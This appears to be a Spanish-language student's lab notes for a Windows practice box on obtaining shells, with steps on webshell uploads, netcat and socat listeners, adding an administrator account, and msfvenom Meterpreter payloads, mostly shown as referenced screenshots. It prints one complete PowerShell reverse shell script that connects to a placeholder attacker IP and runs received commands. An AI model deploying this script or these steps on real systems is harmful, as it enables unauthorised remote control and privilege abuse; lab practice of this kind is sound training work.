---
layout: apunte
title: "15. Windows Practice Box"
---

1. Prueba a activar la `php-reverse-shell`. ¿Funciona?
	1. Subimos la shell.
	   !**Pasted image 20251125195020.png**
	2. Nos ponemos en escucha.
	   !**Pasted image 20251125195258.png**
	3. Activamos la shell y esperamos la conexión.
	   !**Pasted image 20251125195423.png**
	   **No se puede.**
2. Sube una webshell y obtén una reverse shell usando Powershell.
	1. Subimos la shell.
	   !**Pasted image 20251125195633.png**
	2. Nos ponemos en escucha.
	   !**Pasted image 20251125195258.png**
	3. Cargamos la shell y le metemos el comando que vimos en la tarea 11.
	   !**Pasted image 20251125195844.png**
	4. Esperamos la conexión.
	   !**Pasted image 20251125200010.png**
3. El servidor web está corriendo con permisos SYSTEM. Crea un nuevo usuario y añádelo al grupo "administrators", luego inicia sesión por RDP o WinRM.
	1. Añadimos el usuario nuevo y lo metemos al grupo de administradores.
	   !**Pasted image 20251125200148.png**
	2. Inicio sesión con RDP.
	   !**Pasted image 20251125200457.png**
4. Experimenta usando socat y netcat para obtener reverse y bind shells en el objetivo Windows.
	1. Netcat reverse shell.
	   !**Pasted image 20251125211653.png**
	2. Vamos a probar socat.
	   !**Pasted image 20251125211713.png**
	   Tampoco va, pero podíamos subir un socat en binario precompilado.
	3. Vamos a subirlo.
	   !**Pasted image 20251125212356.png**
	4. Ya lo tenemos en la máquina.
	   !**Pasted image 20251125212702.png**
	5. No nos deja.
	   !**Pasted image 20251125213058.png**
	6. Puede que tengamos que iniciar sesión como administrador.
	   No era eso.
	7. Vamos a subir el siguiente archivo y lo llamaremos `reverse.ps1`:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PUERTO>);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
};
$client.Close();
```

!**Pasted image 20251125214017.png**
6. Crea una shell Meterpreter Windows 64 bits usando msfvenom y súbelo al objetivo. Activa la shell y captúrala con el multi/handler.
	1. Creamos el payload en msfvenom.
	   !**Pasted image 20251126104631.png**
	2. Lo subimos a la plataforma.
	   !**Pasted image 20251126104646.png**
	3. Nos ponemos en escucha con Metasploit.
	   !**Pasted image 20251126104806.png**
	4. Creamos un archivo que ejecute el archivo que hemos creado.
	   !**Pasted image 20251126105011.png**
	5. Lo subimos y lo ejecutamos.
	   !**Pasted image 20251126105103.png**
	6. No he conseguido estabilizarla de ninguna manera.
	   !**Pasted image 20251126105358.png**
	7. A ver si entrando como admin y ejecutando el código. Para ello voy a crear otro `.exe` con un puerto diferente.
		1. Entramos con administrador.
		   !**Pasted image 20251126113116.png**
		2. Creamos y cargamos el nuevo archivo.
		   !**Pasted image 20251126113344.png**
		   !**Pasted image 20251126113145.png**
		3. Nos ponemos en escucha con multi/handler (antes debemos configurar el payload, como se ve en la última foto).
		   !**Pasted image 20251126113428.png**
		4. Ejecutamos el código.
		   !**Pasted image 20251126113459.png**
		5. Recibimos la shell.
		   !**Pasted image 20251126114227.png**
		6. Si escribimos help nos salen todos los comandos que podemos utilizar.
		   !**Pasted image 20251126114408.png**
7. Crea una shell Meterpreter staged y uno stageless. Intenta capturarlas con netcat. ¿Funciona?
	1. Creamos la stageless.
	   !**Pasted image 20251126115925.png**
	2. Creamos la staged.
	   !**Pasted image 20251126115939.png**
	3. Subimos las dos.
	   !**Pasted image 20251126115658.png**
	   !**Pasted image 20251126115722.png**
	4. Nos ponemos en escucha con `nc`.
	   !**Pasted image 20251126120213.png**
		1. La stageless sí funciona.
		   !**Pasted image 20251126120357.png**
		2. La del staged no funciona, habría que capturarla con multi/handler.
		   !**Pasted image 20251126121127.png**

